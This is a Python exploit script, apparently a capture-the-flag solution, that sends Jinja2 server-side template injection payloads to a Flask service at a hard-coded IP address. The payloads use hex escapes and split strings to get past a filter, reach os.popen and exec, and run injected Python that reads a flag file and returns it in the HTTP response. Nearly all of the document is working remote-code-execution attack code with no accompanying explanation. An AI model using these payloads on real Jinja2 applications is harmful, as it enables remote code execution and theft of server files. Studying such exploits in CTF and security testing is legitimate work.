import binascii
import requests
import re
import html

URL = "http://103.49.238.77:28961/"

def req(payload):
    res = requests.post(
        URL,data={
            "n": payload
        }
    )
    text = res.text
    print(text)


def get_global_variable():
    req(r'(lipsum,)|list|last')
    req(r'(lipsum,)|map(**{"at"+"tribute": "\x5F\x5Fglobals\x5F\x5F"})|list|last')

def get_attr_os():
    req(r'(lipsum,)|map(**{"at"+"tribute": "\x5F\x5Fglobals\x5F\x5F"})|map(**{"at"+"tribute":"os"})|list|last')

def get_attribute_popen():
    req(r'(lipsum,)|map(**{"at"+"tribute": "\x5F\x5Fglobals\x5F\x5F"})|map(**{"at"+"tribute":"os"})|map(**{"at"+"tribute":"popen"})|list|last')

# ini tidak bisa karena /bin di delete
def get_rce(cmd):
    return r'((((lipsum,)|map(**{"at"+"tribute": "\x5F\x5Fglobals\x5F\x5F"})|map(**{"at"+"tribute":"os"})|map(**{"at"+"tribute":"popen"})|list|last)("%s"),)|map(**{"at"+"tribute": "read"})|list|last)()' % cmd

def execute(cmd):
    return r'''((lipsum,)|map(**{"at"+"tribute": "\x5F\x5Fglobals\x5F\x5F"})|map(**{"at"+"tribute":"\x5F\x5Fbu\x69ltins\x5F\x5F"})|map(**{"at"+"tribute":"exec"})|list|last)("%s")''' % cmd

def hex_encode(x: str):
    x = binascii.hexlify(x.encode()).decode()
    new_x = ""
    for i in range(0, len(x), 2):
        new_x += r"\x{}{}".format(x[i], x[i+1])
    return new_x

if __name__ == "__main__":
    cmd = hex_encode("""
from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    import os
    with open("flag_my_secret_flag_( T - T ).txt", "r") as f:
        flag = f.read()
    r = make_response(flag.replace('TECHCOMFEST2023', 'f'))
    # r = make_response(os.listdir())
    return r
""")
    ex = execute(cmd)
    req(ex)